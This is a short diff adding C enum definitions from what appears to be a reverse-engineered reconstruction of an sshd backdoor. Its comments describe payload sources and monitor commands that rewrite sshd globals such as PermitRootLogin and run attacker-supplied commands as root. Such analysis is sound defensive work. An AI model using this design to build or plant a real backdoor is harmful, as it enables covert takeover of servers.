@@ -1670,6 +1670,13 @@ enum CommandFlags3 {
 };
 
 typedef enum {
+ MONITOR_PAYLOAD_SOURCE_STACK_SCAN = 0x00, /* Scan the stack for the staged ChaCha payload header. */
+ MONITOR_PAYLOAD_SOURCE_EXIT = 0x40, /* Exit sshd immediately after the proxy exchange is requested. */
+ MONITOR_PAYLOAD_SOURCE_STACK_SCAN_ALT = 0x80, /* Alternate stack-scan encoding (same scan path as 0x00). */
+ MONITOR_PAYLOAD_SOURCE_INLINE = 0xC0 /* payload_body/payload_body_size already populated by caller. */
+} monitor_payload_source_t;
+
+typedef enum {
  MONITOR_CMD_CONTROL_PLANE = 0, /* Baseline command stream: updates sshd offsets/logging toggles and can stream continuation payloads through the forged monitor socket. */
  MONITOR_CMD_PATCH_VARIABLES = 1, /* Rewrites sshd globals (PermitRootLogin/use_pam/log hooks) before resuming the monitor loop. */
  MONITOR_CMD_SYSTEM_EXEC = 2, /* Runs attacker-provided setresuid/setresgid/system commands and optionally asks sshd_monitor_cmd_dispatch to exit afterwards. */
